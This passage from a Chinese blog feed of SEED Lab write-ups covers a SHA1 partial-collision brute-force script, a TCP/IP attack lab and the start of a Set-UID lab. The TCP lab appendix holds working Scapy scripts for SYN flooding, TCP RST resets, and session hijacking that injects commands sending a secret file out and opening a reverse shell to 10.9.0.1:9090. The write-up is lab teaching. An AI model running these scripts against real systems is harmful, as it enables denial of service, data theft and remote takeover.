使用暴力穷举方法（生成随机字符串），找到另外一个文件与上述文件具有相同的哈希值（前24 位）。</p><p>实验步骤如下：</p><p>首先计算original.txt 的SHA1 哈希值，得到其前24位如下：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309150957889.png"></p><p>根据得到的前24位哈希值，编写脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/python3</span></span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha1</span><br><span class="line"><span class="keyword">from</span> strgen <span class="keyword">import</span> StringGenerator <span class="keyword">as</span> SG</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">count = <span class="number">0</span></span><br><span class="line">start = time.time()</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    random_str = SG(<span class="string">r&quot;[\w]&#123;17&#125;&quot;</span>).render()</span><br><span class="line">    hash_str = sha1(random_str.encode())</span><br><span class="line">    hex_hash_str = hash_str.hexdigest()</span><br><span class="line">    count = count + <span class="number">1</span></span><br><span class="line">    <span class="comment"># print(random_str)</span></span><br><span class="line">    <span class="comment"># print(&quot;The hexadecimal equivalent of SHA1 is : &quot;)</span></span><br><span class="line">    <span class="comment"># print(hex_hash_str[0:6])</span></span><br><span class="line">    <span class="keyword">if</span> hex_hash_str[<span class="number">0</span>:<span class="number">6</span>] == <span class="string">&quot;4dc981&quot;</span>:</span><br><span class="line">        end = time.time()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Find same hash in 24 bits&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Random_str is :&quot;</span>,random_str)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;SHA1 is :&quot;</span>,hex_hash_str)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Count is :&quot;</span>,count)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Cost time:&quot;</span>,end-start)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>执行该脚本得到结果如下：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309151001240.png"></p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309151001961.png"></p><p>此处生成的随机字符串长度同original.txt，有17位，得到五次碰撞如下：</p><table><thead><tr><th>原文</th><th>密文</th><th>次数</th></tr></thead><tbody><tr><td>iVs3Kjk18KlBgu10v</td><td>4dc9817f10edf31eb2e76bdce63d071944615297</td><td>4519964</td></tr><tr><td>x2vwXgg5_VTg8FjfM</td><td>4dc9815669519a61e1ace2eb8c7081f4c8f3c868</td><td>19477619</td></tr><tr><td>xj10d3J7L38qP0L70</td><td>4dc9812411f31e743a50506bb77a43d476d5d7c6</td><td>33590917</td></tr><tr><td>jQKpQ8kVkFzhyJQBc</td><td>4dc98181cd118240664148ba948fff0be73c2fbe</td><td>15379182</td></tr><tr><td>rkYx0Se0m93vqeyXb</td><td>4dc98131481a7bdc3fa0d6bc391fa8a06e2513c8</td><td>19913632</td></tr></tbody></table><p>平均碰撞次数：18576262.8次</p>]]></content>
      
      
      <categories>
          
          <category> 软件安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> seedlab2.0 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TCP/IP Attack Lab</title>
      <link href="/2022/11/20/Tcp_Attack/"/>
      <url>/2022/11/20/Tcp_Attack/</url>
      
        <content type="html"><![CDATA[<h2 id="一-实验目标"><a href="#一-实验目标" class="headerlink" title="一.实验目标"></a>一.实验目标</h2><p>本本实验室的学习目标是让学生获得关于脆弱性的第一手经验正如针对这些漏洞的攻击一样。聪明人从错误中学习。在安全教育中，我们研究导致软件漏洞的错误。研究过去的错误不仅对学生有帮助理解为什么系统是脆弱的，为什么一个看似善意的错误会变成一场灾难，以及为什么需要许多安全机制。更重要的是，它还可以帮助学生学习常见的模式这样他们就可以避免在将来犯类似的错误。</p><span id="more"></span><p>此外，利用漏洞通过案例研究，学生可以学习安全设计、安全编程和安全测试的原理。TCP&#x2F;IP协议中的漏洞代表了协议设计和实现中特殊类型的漏洞;它们提供了一个宝贵的教训，说明为什么应该从是开始，而不是作为事后的补充。此外，研究这些漏洞有助于学生理解网络安全的挑战，以及为什么需要采取许多网络安全措施。</p><p>在这个实验中，学生将对TCP进行几次攻击。本实验室涵盖以下主题:</p><p>•TCP协议</p><p>•TCP SYN flood攻击和SYN cookies</p><p>•TCP重置攻击</p><p>•TCP会话劫持攻击</p><p>•反向shell</p><h2 id="二-实验原理"><a href="#二-实验原理" class="headerlink" title="二.实验原理"></a>二.实验原理</h2><h3 id="2-1-TCP-x2F-IP协议"><a href="#2-1-TCP-x2F-IP协议" class="headerlink" title="2.1 TCP&#x2F;IP协议"></a>2.1 TCP&#x2F;IP协议</h3><p>TCP&#x2F;IP（Transmission Control Protocol&#x2F;Internet Protocol，传输控制协议&#x2F;互联网协议）是互联网的基本协议，也是国际互联网络的基础。TCP&#x2F;IP 不是指一个协议，也不是 TCP 和 IP 这两个协议的合称，而是一个协议族，包括多个网络协议，比如 IP、ICMP（Internet Control Message Protocol，互联网控制报文协议）、TCP、HTTP（Hyper Text Transfer Protocol，超文本传输协议）、FTP（File Transfer Protocol，文件传输协议）、POP3（Post Office Protocol version 3，邮局协议）等。TCP&#x2F;IP 定义了计算机操作系统如何连入互联网，以及数据传输的标准。TCP&#x2F;IP 是为了解决不同系统的计算机之间的传输通信而提出的一个标准，不同系统的计算机采用了同一种协议后，就能相互通信，从而能够建立网络连接，实现资源共享和网络通信。</p><h3 id="2-2-拓扑搭建"><a href="#2-2-拓扑搭建" class="headerlink" title="2.2 拓扑搭建"></a>2.2 拓扑搭建</h3><p>在这个实验室里，我们至少需要三台机器。我们使用容器来设置实验室环境。图1描述实验室设置。我们将使用攻击者容器来发起攻击，同时使用其他三个容器容器作为受害者和用户机器。我们假设所有这些机器都在同一个局域网上。学生这个实验室也可以使用三个虚拟机，但是使用容器会方便得多。</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181642214.png"></p><h2 id="三-实验器材"><a href="#三-实验器材" class="headerlink" title="三.实验器材"></a>三.实验器材</h2><p>1．Ubuntu20.04。</p><p>2．Wireshark等常用捕包工具。</p><h2 id="四-实验步骤及运行结果"><a href="#四-实验步骤及运行结果" class="headerlink" title="四.实验步骤及运行结果"></a>四.实验步骤及运行结果</h2><h3 id="4-1-Task-1-SYN-Flooding-Attack"><a href="#4-1-Task-1-SYN-Flooding-Attack" class="headerlink" title="4.1 Task 1: SYN Flooding Attack"></a>4.1 Task 1: SYN Flooding Attack</h3><p>SYN flood是DoS攻击的一种形式，攻击者向受害者的TCP端口发送大量SYN请求攻击者无意完成3次握手过程。攻击者要么使用欺骗的IP处理或不继续此过程。通过这种攻击，攻击者可以淹没受害者的队列，即用于半打开的连接，即已经完成SYN, SYN- ack，但还没有得到了最终的ACK。当此队列已满时，受害者不能再接受任何连接。</p><h4 id="4-1-1-Task-1-1-Launching-the-Attack-Using-Python"><a href="#4-1-1-Task-1-1-Launching-the-Attack-Using-Python" class="headerlink" title="4.1.1 Task 1.1: Launching the Attack Using Python"></a>4.1.1 Task 1.1: Launching the Attack Using Python</h4><p>根据实验手册中所给出的代码进行编写，需要完善IP地址，端口号以及转发网卡的补充。根据实验原理可知telnet应该使用23号端口进行接收。然后进行攻击如下：</p><p>首先在攻击者主机中执行SYN泛洪攻击的python程序</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181642196.png"></p><p>在受害者主机中查看收到的SYN请求，发现使用了61个</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181642509.png"></p><p>由于此前限制了其地址池共有80个，根据手册中的指导可以得知可以使用四分之三即60个，多出的一个是已经在USER1和受害者主机之间建立的telnet连接时使用的。</p><p>在USER1主机中退出telnet连接，再重新登录，发现仍然可以与受害者主机成功建立连接，其原因在于受害者主机中地址池剩余的四分之一便是留给已经建立过连接的主机，让其下次登录仍然可以成功，因而攻击会失败。如下图：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181642408.png"></p><p>根据失败的原因，我们可以重新实施攻击，应该首先在受害者主机中清理掉与USER1主机中所建立的信息，然后再重新进行攻击，如下：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181643671.png"></p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181643268.png"></p><p>如图所示，在USER1主机中无法与受害者主机建立连接，证明攻击成功。</p><p>在实验过程中，发现在执行python程序后，需要等待一段时间才可以成功实施攻击，为了提高攻击效率，可以进行如下操作：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181643966.png"></p><p>并发的执行攻击脚本，可以加快受害者主机中地址池的耗尽速度，从而更快的实现攻击</p><h4 id="4-1-2-Task-1-2-Launch-the-Attack-Using-C"><a href="#4-1-2-Task-1-2-Launch-the-Attack-Using-C" class="headerlink" title="4.1.2 Task 1.2: Launch the Attack Using C"></a>4.1.2 Task 1.2: Launch the Attack Using C</h4><p>利用所给出的C程序进行攻击，如下图所示：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181643055.png"></p><p>相比于python程序，发现C程序在执行后无需等待，即可攻击成功，也无需并行执行攻击。</p><h4 id="4-1-3-Task-1-3-Enable-the-SYN-Cookie-Countermeasure"><a href="#4-1-3-Task-1-3-Enable-the-SYN-Cookie-Countermeasure" class="headerlink" title="4.1.3 Task 1.3: Enable the SYN Cookie Countermeasure"></a>4.1.3 Task 1.3: Enable the SYN Cookie Countermeasure</h4><p>请启用SYN cookie机制，并再次运行您的攻击，并比较结果。</p><p>首先在受害者主机中启用SYN cookie机制，如下图：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181644511.png"></p><p>然后再攻击者主机中执行攻击如下：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181644241.png"></p><p>发现在USER1主机中，仍然可以成功建立telnet连接：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181645059.png"></p><p>证明SYN cookie机制可以成功抵御SYN泛洪攻击</p><h3 id="4-2-Task-2-TCP-RST-Attacks-on-telnet-Connections"><a href="#4-2-Task-2-TCP-RST-Attacks-on-telnet-Connections" class="headerlink" title="4.2 Task 2: TCP RST Attacks on telnet Connections"></a>4.2 Task 2: TCP RST Attacks on telnet Connections</h3><p>Manual attack</p><p>在USER1和受害者主机建立好telnet连接时，利用wireshark进行抓包如下：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181646850.png"></p><p>从抓包内容中，我们可以得到最新的序列号，认证号以及在USER1主机中建立telnet连接时所使用的端口号，从而可以在python代码中完善相关内容，然后执行程序，即可断开USER1与受害者之间的telnet连接，如下：</p><p>在USER1主机中，连接被断开：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181646318.png"></p><p>在受害者主机中，也可以查看到连接被断开：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181646910.png"></p><p>但是这种攻击存在一定的缺陷，由于在USER1和受害者主机中建立连接后，USER1可能会不断从键盘上进行输入，而攻击时通过伪造USER1，向受害者主机发送报文实现的，当用户进行输入时，其序列号会发生改变，从而导致攻击失败，因此进行自动化的攻击，可以随时实现成功攻击。</p><p>其原理主要在于通过嗅探过滤得到来自于受害则主机的的数据包，利用该数据包进行伪造，从而得到对应的seq和ack以及端口号，因为是嗅探得到的，所以无需每次去抓包得到正确的序列号。</p><p>攻击具体过程如下所示：</p><p>首先在攻击者主机中，执行python程序，</p><p>其具体代码如下：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181647505.png"></p><p>在USER1主机中，可以观察到连接被断开：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181647563.png"></p><p>在受害者主机中和，也可以观察到前后的连接状况：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181647123.png"></p><p>证明其是自动化实施的攻击，我们可以在USER1与受害者建立telnet连接前，执行攻击脚本，然后再USER1主机中，可以观察到如下：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181647600.png"></p><p>发现在登录过程中，该连接即被中断，在wireshark中，也可以抓包到如下内容：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181648610.png"></p><p>证明攻击成功。</p><h3 id="4-3-Task-3-TCP-Session-Hijacking"><a href="#4-3-Task-3-TCP-Session-Hijacking" class="headerlink" title="4.3 Task 3: TCP Session Hijacking"></a>4.3 Task 3: TCP Session Hijacking</h3><p>TCP会话劫持攻击的目的是劫持一个已存在的TCP连接(会话)通过向会话中注入恶意内容，导致两个受害者。如果此连接是telnet会话，攻击者可以在此会话中注入恶意命令(例如删除重要文件)，使受害者执行恶意命令。在这个任务中，你需要演示如何劫持两台计算机之间的Telnet会话。您的目标是获得telnet服务器从您那里运行恶意命令。为了简化任务，我们假设攻击者和受害者在同一个局域网。</p><p>攻击过程如下：</p><p>为了证明后续攻击实施成功，首先在受害者主机中，创建一个秘密文件，如下图：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181648434.png"></p><p>然后在USER1主机上与受害者建立telnet连接，并利用wireshark进行抓包，利用抓包得到的内容完善python程序，如下图：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181648308.png"></p><p>然后再攻击者主机上执行python脚本，即可成功执行注入的恶意代码，读取受害者主机上的秘密文件：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181648715.png"></p><p>同实验二中的攻击，该攻击存在一定的局限性，因而尝试利用嗅探数据包，重新完善python程序，实现自动化攻击如下：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181649710.png"></p><p>在受害者主机中，我们也可以查看到攻击者主机利用9090端口与受害者主机建立过连接，但是随后就被断开，因而显示超时。</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181649459.png"></p><p>攻击成功</p><h3 id="4-4-Task-4-Creating-Reverse-Shell-using-TCP-Session-Hijacking"><a href="#4-4-Task-4-Creating-Reverse-Shell-using-TCP-Session-Hijacking" class="headerlink" title="4.4 Task 4: Creating Reverse Shell using TCP Session Hijacking"></a>4.4 Task 4: Creating Reverse Shell using TCP Session Hijacking</h3><p>攻击过程如下：</p><p>首先在USER1主机上与受害者建立telnet连接，然后在攻击者主机中，在9090端口监听并且执行python脚本，如下图：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181649824.png"></p><p>并且在受害者主机中可以查看到，当前网络中的连接如下：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181649430.png"></p><p>可以观察到攻击者成功与受害者主机建立了连接，并且在攻击者主机上得到一个受害者主机的shell，但是该shell只是seed用户下的，并没有超级用户权限，如下图：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181650238.png"></p><p>我们可以执行su命令，来得到root权限，如下图：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181650833.png"></p><h2 id="五-附件"><a href="#五-附件" class="headerlink" title="五.附件"></a>五.附件</h2><p>Task1.1</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> IP, TCP, send</span><br><span class="line"><span class="keyword">from</span> ipaddress <span class="keyword">import</span> IPv4Address</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> getrandbits</span><br><span class="line">ip = IP(dst=<span class="string">&quot;10.9.0.5&quot;</span>) <span class="comment"># victim</span></span><br><span class="line">tcp = TCP(dport=<span class="number">23</span>, flags=<span class="string">&#x27;S&#x27;</span>) <span class="comment"># telnet 23</span></span><br><span class="line">pkt = ip/tcp</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    pkt[IP].src = <span class="built_in">str</span>(IPv4Address(getrandbits(<span class="number">32</span>))) <span class="comment"># source ip</span></span><br><span class="line">    pkt[TCP].sport = getrandbits(<span class="number">16</span>) <span class="comment"># source port</span></span><br><span class="line">    pkt[TCP].seq = getrandbits(<span class="number">32</span>) <span class="comment"># sequence number</span></span><br><span class="line">    send(pkt, iface = <span class="string">&#x27;br-579a2284e98b&#x27;</span>, verbose = <span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>Task1.2</p><table><thead><tr><th>实验的配置中已经给出了c语言代码</th></tr></thead></table><p>Task2</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#手动脚本</span></span><br><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># 需要利用 wireshark 进行抓包填写端口号和 seq</span></span><br><span class="line">ip = IP(src=<span class="string">&quot;10.9.0.6&quot;</span>, dst=<span class="string">&quot;10.9.0.5&quot;</span>) <span class="comment"># impersonate the usr</span></span><br><span class="line">tcp = TCP(sport=<span class="number">45908</span>, dport=<span class="number">23</span>, flags=<span class="string">&quot;R&quot;</span>, seq=<span class="number">72446585</span>)</span><br><span class="line">pkt = ip/tcp</span><br><span class="line">ls(pkt)</span><br><span class="line">send(pkt, iface=<span class="string">&quot;br-579a2284e98b&quot;</span>, verbose=<span class="number">0</span>)</span><br><span class="line"><span class="comment">#自动脚本</span></span><br><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># 利用嗅探数据包并且过滤得到来自于受害者主机的数据包，利用该数据包进行伪</span></span><br><span class="line">造</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">spoof_tcp</span>(<span class="params">pkt</span>):</span><br><span class="line">    IPLayer = IP(dst = pkt[IP].src, src=pkt[IP].dst)</span><br><span class="line">    TCPLayer = TCP(flags=<span class="string">&quot;R&quot;</span>, seq=pkt[TCP].ack,</span><br><span class="line">                   dport=pkt[TCP].sport, sport=pkt[TCP].dport)</span><br><span class="line">    spoofpkt = IPLayer/TCPLayer</span><br><span class="line">    ls(spoofpkt)</span><br><span class="line">    send(spoofpkt, verbose=<span class="number">0</span>)</span><br><span class="line">    pkt=sniff(iface=<span class="string">&#x27;br-579a2284e98b&#x27;</span>, <span class="built_in">filter</span>=<span class="string">&#x27;tcp and port 23&#x27;</span>, prn=spoof_tcp)</span><br></pre></td></tr></table></figure><p>Task3</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#手动脚本：</span></span><br><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># 利用 wireshark 抓包得到端口号，seq 和 ack</span></span><br><span class="line">ip = IP(src=<span class="string">&quot;10.9.0.6&quot;</span>, dst=<span class="string">&quot;10.9.0.5&quot;</span>)</span><br><span class="line">tcp = TCP(sport=<span class="number">46128</span>, dport=<span class="number">23</span>, flags=<span class="string">&quot;A&quot;</span>, seq=<span class="number">1791470944</span>, ack=<span class="number">1808897714</span>)</span><br><span class="line">data = <span class="string">&quot;\r cat secretfile &gt; /dev/tcp/10.9.0.1/9090 \r&quot;</span></span><br><span class="line">pkt = ip/tcp/data</span><br><span class="line">ls(pkt)</span><br><span class="line">send(pkt, iface=<span class="string">&quot;br-579a2284e98b&quot;</span>, verbose=<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#自动脚本：</span></span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">spoof_tcp</span>(<span class="params">pkt</span>):</span><br><span class="line">    <span class="comment"># 嗅探来自于受害者主机的数据包，利用该数据包进行伪造，在 data 中注入恶意代</span></span><br><span class="line">    码.</span><br><span class="line">    ip = IP(src=pkt[IP].dst,dst=pkt[IP].src)</span><br><span class="line">    tcp = TCP(sport=pkt[TCP].dport, dport=<span class="number">23</span>, flags=<span class="string">&quot;A&quot;</span>, seq=pkt[TCP].ack+<span class="number">5</span>,</span><br><span class="line">              ack=pkt[TCP].seq)</span><br><span class="line">    data = <span class="string">&quot;\r cat secretfile &gt; /dev/tcp/10.9.0.1/9090 \r&quot;</span></span><br><span class="line">    pkt = ip/tcp/data</span><br><span class="line">    <span class="comment"># ls(pkt)</span></span><br><span class="line">    send(pkt, iface=<span class="string">&quot;br-579a2284e98b&quot;</span>, verbose=<span class="number">0</span>)</span><br><span class="line">    pkt=sniff(iface=<span class="string">&#x27;br-579a2284e98b&#x27;</span>, <span class="built_in">filter</span>=<span class="string">&#x27;tcp and src host 10.9.0.5 and src port 23&#x27;</span>,</span><br><span class="line">              prn=spoof_tcp)</span><br></pre></td></tr></table></figure><p>Task4</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">spoof_tcp</span>(<span class="params">pkt</span>):</span><br><span class="line">    <span class="comment"># 利用嗅探到的数据包进行伪造数据包，根据实验手册的指导构造注入的恶意代</span></span><br><span class="line">    码。</span><br><span class="line">    ip = IP(src=pkt[IP].dst,dst=pkt[IP].src)</span><br><span class="line">    tcp = TCP(sport=pkt[TCP].dport, dport=pkt[TCP].sport, flags=<span class="string">&quot;A&quot;</span>,</span><br><span class="line">              seq=pkt[TCP].ack+<span class="number">5</span>, ack=pkt[TCP].seq+<span class="built_in">len</span>(pkt[TCP].payload))</span><br><span class="line">    data = <span class="string">&quot;\r /bin/bash -i &gt; /dev/tcp/10.9.0.1/9090 0&lt;&amp;1 2&gt;&amp;1 \r&quot;</span></span><br><span class="line">    pkt = ip/tcp/data</span><br><span class="line">    <span class="comment"># ls(pkt)</span></span><br><span class="line">    send(pkt, iface=<span class="string">&quot;br-579a2284e98b&quot;</span>, verbose=<span class="number">0</span>)</span><br><span class="line">    <span class="comment"># 嗅探来自于受害者主机 23 端口的数据包</span></span><br><span class="line">    pkt=sniff(iface=<span class="string">&#x27;br-579a2284e98b&#x27;</span>, <span class="built_in">filter</span>=<span class="string">&#x27;tcp and src host 10.9.0.5 and src port 23&#x27;</span>,</span><br><span class="line">              prn=spoof_tcp) </span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 软件安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> seedlab2.0 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Environment Variable and Set-UID</title>
      <link href="/2022/11/12/Setuid/"/>
      <url>/2022/11/12/Setuid/</url>
      
        <content type="html"><![CDATA[<h1 id="环境变量与setuid实验"><a href="#环境变量与setuid实验" class="headerlink" title="环境变量与setuid实验"></a>环境变量与setuid实验</h1><h2 id="一-实验目的"><a href="#一-实验目的" class="headerlink" title="一.实验目的"></a>一.实验目的</h2><p>本实验的学习目标是让你理解环境变量是如何影响程序和系统的行为的。环境变量是存储在进程中的一系列动态命名的值，可以影响计算机上进程的行为方式。自从1979 年Unix 引入环境变量以来，大多数操作系统也开始采用环境变量。尽管环境变量会影响程序的行为，但是它是如何产生影响的，许多程序员并不真正理解。因此，如果一个程序利用了环境变量但是程序员不清楚它的运用，就可能会导致程序漏洞。</p><span id="more"></span><p>在本实验中，你将理解环境变量是如何工作，子进程是如何继承父进程的环境变量的，以及环境变量如何影响系统&#x2F;程序的行为的。我们还会特别了解环境变量是如何影响Set-UID 特权程序的行为的。本实验涵盖以下主题:</p><p>1. 环境变量</p><p>2. Set-UID 程序</p><p>3. 安全地调用外部程序</p><p>4. 权限泄漏</p><p>5. 动态装载器&#x2F;链接器</p><h2 id="二-实验步骤与结果"><a href="#二-实验步骤与结果" class="headerlink" title="二.实验步骤与结果"></a>二.实验步骤与结果</h2><h3 id="2-1-Task-1：配置环境变量"><a href="#2-1-Task-1：配置环境变量" class="headerlink" title="2.1 Task 1：配置环境变量"></a>2.1 Task 1：配置环境变量</h3><p>本任务中，我们学习设置和删除环境变量的指令。我们用Bash 来完成。用户使用的默认的shell 设置在文件&#x2F;etc&#x2F;passwd 中（每一项的最后一个字段）。你可以用chsh 命令来修改shell 程序（本实验无需修改）。请完成以下任务：</p><p>• 使用printenv 或者env 指令来打印环境变量。如果你对某个特定的环境变量感兴趣，比如PWD， 你可以用指令“printenv PWD”或者“env | grep PWD”。</p><p>我们可以打印全部环境变量以及PWD如下：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309140936255.png"></p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309140937831.png"></p><p>• 使用export 和unset 来设置或者取消环境变量。注意: 这两个指令不是单独的程序；它们是两个Bash 的内部指令（即，你不能在Bash 外调用它们噢）</p><p>设置一个新的环境变量然后取消 MYENV，如下：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309140942383.png"></p><h3 id="2-2-Task-2-从父进程向子进程传递环境变量"><a href="#2-2-Task-2-从父进程向子进程传递环境变量" class="headerlink" title="2.2 Task 2: 从父进程向子进程传递环境变量"></a>2.2 Task 2: 从父进程向子进程传递环境变量</h3><p>本任务中，我们研究子进程是如何继承父进程的环境变量的。Unix 操作系统中，fork() 系统调用会复制发起调用的进程，创建一个新进程。新进程称作子进程，被复制的进程称作父进程。然而，有些东西是没有被子进程继承的（在命令行中输入指令man fork，可以查看fork() 的指南）。在本任务中，我们想要知道子进程是否继承了父进程的环境变量。</p><p>Step1：编译并运行 myprintenv.c 文件，将输出保存到一个文件中</p><p>Step2：注释掉子进程的语句，取消注释父进程printenv()语句，再次编译并运行代码，将结果保存在另一个文件中。</p><p>两次的运行输出结果如下图所示：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309140942584.png"></p><p>Step3：使用diff命令比较两个文件的差异，描述你得出的结论。</p><p><img 